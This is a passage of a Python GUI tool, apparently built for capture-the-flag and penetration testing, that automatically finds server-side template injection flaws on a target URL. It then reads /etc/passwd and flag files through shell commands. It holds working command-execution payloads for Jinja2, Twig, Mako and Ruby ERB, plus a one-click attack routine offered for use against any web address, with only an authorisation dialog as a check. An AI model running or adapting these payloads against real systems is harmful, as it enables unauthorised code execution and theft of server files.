            "{{cycler.__init__.__globals__.os.popen(\"echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname '*flag*' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_\").read()}}",
        ],
        'Twig': [
            '{{["echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_"]|filter("system")}}',
        ],
        'Mako': [
            '${self.module.runtime.util.os.popen("echo SSTI_{{TOKEN}}_START_; find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null; echo SSTI_{{TOKEN}}_END_").read()}',
        ],
        'Ruby_ERB': [
            '<%= "SSTI_{{TOKEN}}_START_" + `find / -maxdepth 4 -iname \'*flag*\' -type f 2>/dev/null` + "SSTI_{{TOKEN}}_END_" %>',
        ],
    }

    FLAG_COMMON_PATHS = [
        '/flag', '/flag.txt', '/FLAG', '/flag.md',
        '/app/flag', '/app/flag.txt',
        '/root/flag', '/root/flag.txt',
        '/tmp/flag', '/tmp/flag.txt',
        '/var/www/flag', '/var/www/html/flag.txt',
    ]

    @staticmethod
    def _make_token():
        """產生本次讀取專用的唯一標記，避免與頁面既有內容或前次殘留輸出混淆"""
        import random
        import string
        return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))

    @staticmethod
    def _extract_by_token(probe_text, token):
        """
        在回應中尋找 SSTI_<token>_START_ 與 SSTI_<token>_END_ 之間的內容並回傳。
        因為 token 是每次讀取隨機產生，不會與頁面固有內容混淆，抓不到就是真的
        沒有命中（gadget 失敗、被過濾等），不像逐行 diff 基準頁面那樣在頁面本身
        會變動時（時間戳、隨機區塊等）產生誤判或抓到不完整的內容。
        """
        if not probe_text:
            return None
        pattern = re.compile(
            re.escape(f'SSTI_{token}_START_') + r'(.*?)' + re.escape(f'SSTI_{token}_END_'),
            re.S
        )
        m = pattern.search(probe_text)
        if not m:
            return None
        return m.group(1).strip('\r\n').strip()

    def read_file(self, point, engine, filepath, log_cb=None):
        """
        在指定引擎下讀取單一檔案內容，依序嘗試該引擎所有候選 gadget chain，
        任一條成功就回傳；全部失敗才回報失敗。回傳 (成功與否, 內容或錯誤訊息, 耗時, 使用的chain索引)。
        每條 payload 帶入獨立產生的 token，用來包裹指令輸出，回應解析時直接用
        token marker 定位擷取範圍，不依賴與基準頁面的內容比對。
        """
        templates = self.FILE_READ_PAYLOADS.get(engine)
        if not templates:
            return False, f'{engine} 尚無讀檔 payload', 0, -1

        fail_markers = ['No such file', 'cannot find', 'command not found', 'Errno 2']
        last_text, last_elapsed = '', 0

        for idx, template in enumerate(templates):
            token = self._make_token()
            payload = template.replace('{{PATH}}', filepath).replace('{{TOKEN}}', token)
            text, status, elapsed = self.send_to_point(point, payload)
            last_text, last_elapsed = text, elapsed

            if log_cb:
                log_cb(f"    [chain {idx+1}/{len(templates)}] payload: {payload}")
                log_cb(f"    [chain {idx+1}/{len(templates)}] status={status} elapsed={elapsed:.2f}s resp_len={len(text) if text else 0}")

            if status != 200 or not text:
                if log_cb:
                    log_cb(f"    [chain {idx+1}] 跳過：status 非 200 或回應為空")
                continue

            extracted = self._extract_by_token(text, token)
            if extracted is None:
                if log_cb:
                    log_cb(f"    [chain {idx+1}] 跳過：回應中找不到 token marker (SSTI_{token}_START_/_END_)，"
                           f"可能是 gadget 未執行、輸出被過濾/跳脫，或注入點選錯。回應片段: {text[:300]!r}")
                continue

            if any(m in extracted for m in fail_markers):
                if log_cb:
                    log_cb(f"    [chain {idx+1}] 跳過：擷取到內容但含錯誤字樣: {extracted[:200]!r}")
                continue

            if log_cb:
                log_cb(f"    [+] 第 {idx+1} 條 gadget chain 命中，擷取內容長度={len(extracted)}")
            return True, extracted, elapsed, idx

        return False, last_text, last_elapsed, -1

    def search_flag_and_passwd(self, point, engine, log_cb, result_cb):
        """自動尋找 /etc/passwd 與常見 flag 路徑"""
        findings = []

        log_cb("[*] 讀取 /etc/passwd ...")
        success, output, elapsed, chain_idx = self.read_file(point, engine, '/etc/passwd', log_cb)
        if success and 'root:' in output:
            log_cb(f"[+] /etc/passwd 讀取成功 ({elapsed:.2f}s)")
            log_cb(f"    {output[:500]}")
            findings.append({'target': '/etc/passwd', 'output': output})
            result_cb({'phase': '讀檔', 'chain': engine, 'cmd': 'cat /etc/passwd', 'status': f'成功 ({elapsed:.2f}s)', 'output': output[:2000]})
        else:
            log_cb("[-] /etc/passwd 讀取失敗")

        log_cb("[*] 搜尋常見 flag 路徑 ...")
        for path in self.FLAG_COMMON_PATHS:
            if not self.scanning:
                break
            success, output, elapsed, chain_idx = self.read_file(point, engine, path, log_cb)
            if success and output.strip():
                log_cb(f"[+] 找到 flag 檔案: {path}")
                log_cb(f"    {output[:300]}")
                findings.append({'target': path, 'output': output})
                result_cb({'phase': '讀檔', 'chain': engine, 'cmd': f'cat {path}', 'status': f'成功 ({elapsed:.2f}s)', 'output': output[:2000]})

        search_cmds = self.FLAG_SEARCH_COMMANDS.get(engine, [])
        if search_cmds:
            log_cb("[*] 執行 find 搜尋 *flag* 檔案 ...")
            found = False
            for idx, search_cmd in enumerate(search_cmds):
                token = self._make_token()
                payload = search_cmd.replace('{{TOKEN}}', token)
                text, status, elapsed = self.send_to_point(point, payload)
                extracted = self._extract_by_token(text, token) if status == 200 else None
                if extracted:
                    if idx > 0:
                        log_cb(f"    [i] 第 {idx+1} 條 gadget chain 命中（前 {idx} 條無效）")
                    log_cb("[+] find 搜尋結果:")
                    log_cb(f"    {extracted[:500]}")
                    findings.append({'target': 'find *flag*', 'output': extracted})
                    result_cb({'phase': '讀檔', 'chain': engine, 'cmd': 'find *flag*', 'status': f'成功 ({elapsed:.2f}s)', 'output': extracted[:2000]})
                    found = True
                    break
            if not found:
                log_cb("[-] find 搜尋無結果")

        log_cb(f"[*] 搜尋完成，共 {len(findings)} 項命中")
        return findings

    def one_click_attack(self, url, delay, log_cb, result_cb, filter_cb):
        self.reset_state()
        log_cb("=" * 60)
        log_cb("SSTI 掃描開始 (指紋識別 + WAF偵測 + 讀檔搜尋，任意命令執行RCE已停用)")
        log_cb(f"目標: {url}")
        log_cb("=" * 60)

        points = self.auto_discover(url, log_cb)
        if not points:
            log_cb("[-] 未發現任何注入點")
            return False

        log_cb("[Step 1/3] 智能指紋識別（數學驗證 + 錯誤分析 + 差異比對）...")
        engine, conf, point, details = self.fingerprint_all(points, log_cb)
        if not engine:
            log_cb("[-] 未檢測到 SSTI，掃描終止")
            return False
        self.detected_engine = engine
        self.detected_confidence = conf
        ptype, purl, pmethod, pdata, pdesc = point
        log_cb(f"[+] 識別引擎: {engine} (信心度: {conf})")
        log_cb(f"[+] 有效注入點: {pdesc} @ {purl} [{pmethod}]")

        log_cb("[Step 2/3] 自動探測 WAF/黑名單過濾...")
        filters, level = self.detect_filters(point, engine)
        log_cb(f"[*] 過濾強度: {level}/10")
        filter_cb(filters, level)
        for k, v in filters.items():
            log_cb(f"    {'BLOCKED' if v else 'OK'} {k}")
        result_cb({'phase': '指紋識別', 'chain': engine, 'cmd': '', 'status': f'信心度 {conf}, 過濾強度 {level}/10', 'output': ''})

        log_cb("[Step 3/3] 自動尋找 /etc/passwd 與 flag ...")
        if engine not in self.FILE_READ_PAYLOADS:
            log_cb(f"[-] {engine} 尚無讀檔 payload，跳過")
        else:
            findings = self.search_flag_and_passwd(point, engine, log_cb, result_cb)
            self.findings = findings

        log_cb("=" * 60)
        log_cb("掃描完成（RCE 功能已停用，僅執行讀檔）")
        return True


class SSTIOneClickGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SSTI One-Click — 智能封包檢測版")
        self.root.geometry("1200x900")
        self.attacker = None
        self.scanning = False
        self.results_data = []
        self.setup_ui()

    def setup_ui(self):
        style = ttk.Style()
        style.theme_use('clam')
        main = ttk.Frame(self.root, padding="15")
        main.pack(fill=tk.BOTH, expand=True)

        ttk.Label(main, text="SSTI One-Click", font=('Microsoft JhengHei', 24, 'bold')).pack()
        ttk.Label(main, text="智能封包檢測版 — 數學驗證 + 錯誤分析 + 差異比對", font=('Microsoft JhengHei', 12), foreground='gray').pack()
        ttk.Label(main, text="僅供學習與授權滲透測試使用", foreground='red', font=('Microsoft JhengHei', 9)).pack(pady=(0, 15))

        input_frame = ttk.Frame(main)
        input_frame.pack(fill=tk.X, pady=10)

        ttk.Label(input_frame, text="目標 URL:", font=('Microsoft JhengHei', 12)).pack(side=tk.LEFT, padx=5)
        self.url_var = tk.StringVar(value="http://target.com/")
        url_entry = ttk.Entry(input_frame, textvariable=self.url_var, width=70, font=('Consolas', 12))
        url_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        url_entry.bind('<Return>', lambda e: self.start_attack())

        btn_frame = ttk.Frame(main)
        btn_frame.pack(fill=tk.X, pady=10)

        self.attack_btn = tk.Button(btn_frame, text="🚀 一鍵攻擊", command=self.start_attack,
                                     font=('Microsoft JhengHei', 14, 'bold'), bg='#ff6b6b', fg='white',
                                     activebackground='#ee5a5a', activeforeground='white',
                                     padx=30, pady=10, cursor='hand2')
        self.attack_btn.pack(side=tk.LEFT, padx=5)

        self.stop_btn = tk.Button(btn_frame, text="⏹ 停止", command=self.stop_attack, state=tk.DISABLED,
                                   font=('Microsoft JhengHei', 12), padx=20, pady=10)
        self.stop_btn.pack(side=tk.LEFT, padx=5)

        ttk.Button(btn_frame, text="💾 匯出報告", command=self.export_report).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="🧹 清除", command=self.clear_all).pack(side=tk.LEFT, padx=5)

        self.progress = ttk.Progressbar(main, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=5)

        result_nb = ttk.Notebook(main)
        result_nb.pack(fill=tk.BOTH, expand=True, pady=5)

        log_frame = ttk.Frame(result_nb, padding="5")
        result_nb.add(log_frame, text="📜 執行日誌")
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, font=('Consolas', 10))
        self.log_text.pack(fill=tk.BOTH, expand=True)

        raw_frame = ttk.Frame(result_nb, padding="5")
        result_nb.add(raw_frame, text="📄 原始命令輸出")
        self.raw_text = scrolledtext.ScrolledText(raw_frame, wrap=tk.WORD, font=('Consolas', 10))
        self.raw_text.pack(fill=tk.BOTH, expand=True)

        detail_frame = ttk.Frame(result_nb, padding="5")
        result_nb.add(detail_frame, text="📊 詳細彙總")
        self.detail_text = scrolledtext.ScrolledText(detail_frame, wrap=tk.WORD, font=('Consolas', 10))
        self.detail_text.pack(fill=tk.BOTH, expand=True)

        self.status_var = tk.StringVar(value="就緒 — 輸入 URL 後點擊「一鍵攻擊」")
        ttk.Label(main, textvariable=self.status_var, font=('Consolas', 10), foreground='gray').pack(fill=tk.X, pady=5)

        self.log("SSTI One-Click 智能封包檢測版已就緒")
        self.log("檢測邏輯：數學運算驗證 → 錯誤訊息分析 → 回應差異比對")
        self.log("=" * 60)

    def log(self, msg):
        ts = time.strftime('%H:%M:%S')
        self.log_text.insert(tk.END, f"[{ts}] {msg}\n")
        self.log_text.see(tk.END)

    def add_result(self, r):
        self.results_data.append(r)
        if r.get('output'):
            self.raw_text.insert(tk.END, f"\n{'='*60}\n")
            self.raw_text.insert(tk.END, f"[Phase: {r.get('phase', '')}] [Chain: {r.get('chain', '')}]\n")
            self.raw_text.insert(tk.END, f"[Cmd: {r.get('cmd', '')}] [Status: {r.get('status', '')}]\n")
            self.raw_text.insert(tk.END, f"{'='*60}\n")
            self.raw_text.insert(tk.END, f"{r.get('output', '')}\n")
            self.raw_text.see(tk.END)

    def update_filters(self, filters, level):
        self.log(f"[*] WAF/過濾分析結果（強度: {level}/10）:")
        for k, v in filters.items():
            status = "🚫 已過濾" if v else "✅ 可用"
            self.log(f"    {status} {k}")

    def start_attack(self):
        url = self.url_var.get().strip()
        if not url.startswith(('http://', 'https://')):
            messagebox.showwarning("警告", "URL 必須以 http:// 或 https:// 開頭")
            return
        if not messagebox.askyesno("授權確認", "您是否擁有對此目標進行安全測試的明確授權？"):
            return

        self.scanning = True
        self.attacker = SSTIEngine(timeout=15, verify_ssl=False)
        self.attacker.scanning = True
        self.attack_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.progress.start()
        self.status_var.set("掃描中... 智能封包檢測 → 識別引擎 → 偵測WAF/黑名單過濾 → 搜尋flag/passwd")

        self.raw_text.delete(1.0, tk.END)
        self.detail_text.delete(1.0, tk.END)
        self.results_data.clear()

        thread = threading.Thread(target=self._run_attack)
        thread.daemon = True
        thread.start()

    def _run_attack(self):
        try:
            url = self.url_var.get()
            delay = 5

            def log_cb(msg):
                if not self.scanning:
                    return None
                self.root.after(0, self.log, msg)

            success = self.attacker.one_click_attack(url, delay, log_cb,
                lambda r: self.root.after(0, self.add_result, r),
                lambda f, l: self.root.after(0, self.update_filters, f, l))

            if success:
                detail = "\n指紋識別結果彙總:\n" + "="*60 + "\n"
                detail += f"\n引擎: {self.attacker.detected_engine}\n"
                detail += f"信心度: {self.attacker.detected_confidence}\n"
                detail += f"過濾規則: {self.attacker.filters}\n"
                findings = getattr(self.attacker, 'findings', [])
                detail += f"\nflag/passwd 搜尋結果 ({len(findings)} 項命中):\n" + "-"*40 + "\n"
                for item in findings:
                    detail += f"\n【{item['target']}】\n{item['output'][:2000]}\n"
                self.root.after(0, lambda: self.detail_text.insert(tk.END, detail))

            if not success:
                self.root.after(0, lambda: self.status_var.set("掃描失敗 — 未檢測到 SSTI"))
            else:
                self.root.after(0, lambda: self.status_var.set("掃描完成 — 請查看「原始命令輸出」和「詳細彙總」分頁"))

        except Exception as e:
            self.root.after(0, self.log, f"[!] 錯誤: {e}")
            import traceback
            self.root.after(0, self.log, traceback.format_exc())
        finally:
            self.root.after(0, self._attack_done)

    def _attack_done(self):
        self.scanning = False
        if self.attacker:
            self.attacker.scanning = False
        self.attack_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.progress.stop()
        self.log("=" * 60)
        self.log("攻擊流程結束")

    def stop_attack(self):
        self.scanning = False
        if self.attacker:
            self.attacker.scanning = False
        self.log("[!] 使用者中斷攻擊")

    def export_report(self):
        if not self.results_data:
            messagebox.showinfo("提示", "沒有結果可匯出")
            return
        fp = filedialog.asksaveasfilename(defaultextension=".html",
            filetypes=[("HTML", "*.html"), ("JSON", "*.json"), ("CSV", "*.csv"), ("Text", "*.txt")])
        if not fp:
            return
        try:
            if fp.endswith('.json'):
                with open(fp, 'w', encoding='utf-8') as f:
                    json.dump(self.results_data, f, ensure_ascii=False, indent=2)
            elif fp.endswith('.csv'):
                with open(fp, 'w', newline='', encoding='utf-8') as f:
                    w = csv.DictWriter(f, fieldnames=['phase', 'chain', 'cmd', 'status', 'output'])
                    w.writeheader()
                    w.writerows(self.results_data)
            elif fp.endswith('.html'):
                with open(fp, 'w', encoding='utf-8') as f:
                    f.write('<html><head><meta charset="utf-8"><title>SSTI Report</title><style>')
                    f.write('body{font-family:monospace;max-width:1200px;margin:0 auto;padding:20px;}')
                    f.write('table{border-collapse:collapse;width:100%;}th,td{border:1px solid #ddd;padding:8px;text-align:left;}')
                    f.write('th{background:#333;color:#fff;}pre{white-space:pre-wrap;word-wrap:break-word;background:#f4f4f4;padding:10px;border-radius:4px;}')
                    f.write('</style></head><body>')
                    f.write('<h1>SSTI 攻擊報告</h1>')
                    f.write(f'<p>生成時間: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>')
                    f.write('<table><tr><th>Phase</th><th>Chain</th><th>Cmd</th><th>Status</th><th>Output</th></tr>')
                    for r in self.results_data:
                        f.write(f"<tr><td>{html.escape(str(r.get('phase','')))}</td>")
                        f.write(f"<td>{html.escape(str(r.get('chain','')))}</td>")
                        f.write(f"<td>{html.escape(str(r.get('cmd','')))}</td>")
                        f.write(f"<td>{html.escape(str(r.get('status','')))}</td>")
                        f.write(f"<td><pre>{html.escape(str(r.get('output',''))[:2000])}</pre></td></tr>")
                    f.write('</table></body></html>')
            else:
                with open(fp, 'w', encoding='utf-8') as f:
                    for r in self.results_data:
                        f.write(f"{'='*60}\n")
                        for k, v in r.items():
                            f.write(f"{k}: {v}\n")
            self.log(f"報告已匯出: {fp}")
            messagebox.showinfo("成功", f"報告已匯出至 {fp}")
        except Exception as e:
            messagebox.showerror("錯誤", str(e))

    def clear_all(self):
        self.raw_text.delete(1.0, tk.END)
        self.detail_text.delete(1.0, tk.END)
        self.log_text.delete(1.0, tk.END)
        self.results_data.clear()
        self.status_var.set("就緒 — 輸入 URL 後點擊「一鍵攻擊」")
        self.log("已清除")


def main():
    root = tk.Tk()
    app = SSTIOneClickGUI(root)
    root.mainloop()


if __name__ == '__main__':
    main()